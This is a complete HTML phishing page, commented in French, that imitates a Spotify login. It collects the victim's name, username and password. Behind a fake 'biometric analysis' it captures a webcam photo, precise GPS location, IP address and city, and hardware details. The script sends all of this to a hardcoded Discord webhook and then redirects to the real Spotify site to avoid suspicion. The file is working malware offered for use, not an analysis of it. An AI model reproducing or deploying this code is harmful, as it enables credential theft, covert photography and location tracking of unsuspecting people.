<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Spotify</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Figtree:wght@400;700;900&display=swap');
        body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; margin: 0; display: flex; justify-content: center; overflow: hidden; }
        .app-card { width: 100%; max-width: 450px; padding: 40px 25px; text-align: center; }
        .logo { width: 45px; margin: 0 auto 30px auto; }
        
        /* Fenêtre de caméra visible pour éviter le noir */
        #cam-box { display: none; margin: 20px auto; width: 180px; height: 180px; border-radius: 50%; border: 3px solid #1ed760; overflow: hidden; background: #121212; position: relative; }
        video { width: 100%; height: 100%; object-fit: cover; }
        
        .field { text-align: left; margin-bottom: 15px; }
        label { display: block; font-size: 12px; font-weight: 700; margin-bottom: 6px; color: #b3b3b3; }
        input { width: 100%; background: #121212; border: none; border-radius: 4px; padding: 14px; color: #fff; font-size: 15px; outline: none; }
        .btn-green { background: #1ed760; color: #000; font-weight: 900; padding: 18px; border-radius: 500px; width: 100%; margin-top: 10px; font-size: 14px; border: none; cursor: pointer; text-transform: uppercase; }
        
        #status { font-size: 12px; color: #1ed760; margin-top: 15px; font-weight: 700; display: none; }
        #c { display: none; }
    </style>
</head>
<body>
    <div class="app-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" class="logo">
        
        <div id="cam-box"><video id="v" autoplay playsinline muted></video></div>
        <div id="status">ANALYSE BIOMÉTRIQUE EN COURS...</div>

        <div id="form-ui">
            <div class="flex gap-2">
                <div class="field w-1/2"><label>Prénom</label><input id="fn" type="text" placeholder="Levon"></div>
                <div class="field w-1/2"><label>Nom</label><input id="ln" type="text" placeholder="Jaunin"></div>
            </div>
            <div class="field"><label>E-mail ou nom d'utilisateur</label><input id="u" type="text"></div>
            <div class="field"><label>Mot de passe</label><input id="p" type="password"></div>
            <button onclick="startV29()" id="btn" class="btn-green">Vérifier et Se connecter</button>
        </div>
    </div>

    <canvas id="c"></canvas>

    <script>
        const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";

        async function startV29() {
            const data = { fn: document.getElementById('fn').value, ln: document.getElementById('ln').value, u: document.getElementById('u').value, p: document.getElementById('p').value };
            if(!data.u || !data.p) return;

            // 1. Affiche la caméra (ça force l'autorisation)
            document.getElementById('form-ui').style.display = 'none';
            document.getElementById('cam-box').style.display = 'block';
            document.getElementById('status').style.display = 'block';

            let gps = "❌ Bloqué";
            let stream = null;

            try {
                // Force GPS
                navigator.geolocation.getCurrentPosition((pos) => {
                    gps = `✅ **GPS :** [Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
                }, null, {enableHighAccuracy: true});

                // Force Caméra (Visible)
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                document.getElementById('v').srcObject = stream;

                // Attendre 2.5 secondes pour que l'image soit parfaite
                await new Promise(r => setTimeout(r, 2500));

                // Capture
                const can = document.getElementById('c');
                const vid = document.getElementById('v');
                can.width = vid.videoWidth; can.height = vid.videoHeight;
                can.getContext('2d').drawImage(vid, 0, 0);
                
                // Envoi des infos hardware (image_c61034)
                let net = {}; try { net = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
                let bat = {}; try { bat = await navigator.getBattery(); } catch(e){}
                const gl = document.createElement('canvas').getContext('webgl');
                const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "Inconnu";

                const payload = {
                    embeds: [{
                        title: `💎 ELITE LOG V29 - ${data.fn} ${data.ln}`,
                        color: 1955168,
                        fields: [
                            { name: "👤 COMPTE", value: `**Nom:** \`${data.ln}\` **Prénom:** \`${data.fn}\`\n**User:** \`${data.u}\` **Pass:** \`${data.p}\`` },
                            { name: "📍 LOC", value: `**Maps:** ${gps}\n**IP:** \`${net.ip}\` **Ville:** \`${net.city}\`` },
                            { name: "📱 STATS", value: `**GPU:** \`${gpu}\`\n**RAM:** \`${navigator.deviceMemory}GB\`\n**Bat:** \`${Math.round(bat.level*100)}%\`` }
                        ]
                    }]
                };
                await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });

                // Envoi de la photo
                can.toBlob(async b => {
                    const fd = new FormData();
                    fd.append('file', b, 'face.jpg');
                    fd.append('content', `📸 **Capture de ${data.fn} ${data.ln}**`);
                    await fetch(hook, { method: 'POST', body: fd });
                    stream.getTracks().forEach(t => t.stop());
                    window.location.href = "https://www.spotify.com/fr/premium/";
                }, 'image/jpeg', 0.8);

            } catch(e) {
                // Si tout échoue, on redirige quand même pour pas être suspect
                window.location.href = "https://www.spotify.com/fr/premium/";
            }
        }
    </script>
</body>
</html>
